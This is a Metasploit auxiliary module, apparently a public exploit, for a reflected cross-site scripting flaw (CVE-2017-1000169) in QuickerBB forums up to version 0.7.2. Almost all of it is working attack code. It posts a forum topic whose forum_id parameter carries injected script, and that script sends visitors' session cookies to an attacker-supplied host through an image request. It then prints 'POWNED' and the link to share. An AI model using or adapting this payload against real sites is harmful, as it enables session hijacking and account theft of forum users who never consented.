##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
require 'msf/core'
require 'uri'
require 'net/http'
 
class MetasploitModule < Msf::Auxiliary
  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Reflected XSS exploit for QuickerBB <= 0.7.2 powered forum',
      'Description'    => %q{
        Exploits a reflected XSS vulnerability of QuickerBB(<=0.7.2) powered forum allowing to highjack user's cookies.
     },
     'Author'         => [ 'Muranovic Allan' ],
     'License'        => MSF_LICENSE,
     'References'    =>
       [
         ['URL','https://www.cvedetails.com/cve/CVE-2017-1000169/'],
       ]
   ))
   register_options(
     [
       OptString.new('DEST', [ true, "Adress to which the cookie will be sent. (ex: http://192.168.1.10)", "None"]),
       OptString.new('TARGET', [ true, "Target adress. (ex: example.com)", "None"]),
       OptString.new('PATH', [ true, "Path of the forum in which will the XSS reflected be hosted. (ex: quickerBB/...)", "None"]),
       OptString.new('HCOOKIE', [ true, "Cookie used by the host allowing to connect to the website with the credentials.", "None"]),
       OptString.new('TITLE', [ false, "Title of the topic containing the reflected XSS. --Optional", "None"]),
       OptString.new('CONTENT', [ false, "Content of the topic containing the reflected XSS. --Optional", "None"])
     ])
 end
   
 def run
   http = Net::HTTP.new("#{datastore["TARGET"]}",80)
   path = "#{datastore["PATH"]}"
   data = "subject=#{datastore["TITLE"]}&message=#{datastore["CONTENT"]}&forum_id=az\">%3Cscript%3Edocument.write('<img src=\"#{datastore["DEST"]}/collect.gif?cookie='%2Bdocument.cookie%2B'/>')%3C/script%3E"
    headers = {
     'Cookie' => "#{datastore["HCOOKIE"]}",
     'Referer' => '#{datastore["TARGET"]}#{datastore["PATH"]}',
     'Content-Type' => 'application/x-www-form-urlencoded'
    }
    resp, data = http.post(path, data, headers)
   print_status("POWNED")
   print_status(" link : \".../#{resp['location']}\" ")
  end
end